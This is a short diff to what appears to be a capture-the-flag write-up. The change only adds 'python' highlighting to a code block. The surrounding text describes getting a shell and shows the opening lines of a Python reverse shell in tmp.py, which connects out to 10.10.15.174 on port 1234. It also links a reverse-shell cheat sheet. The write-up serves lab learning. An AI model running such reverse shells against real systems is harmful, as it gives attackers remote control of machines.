@@ -146,7 +146,7 @@ After a short amount of time, the flag is indeed written to the /var/tmp directo
 Getting a shell from this is then as simple as setting the python file to run any number of [reverse shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 We'll place the following in tmp.py:
-```
+```python
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("10.10.15.174",1234))
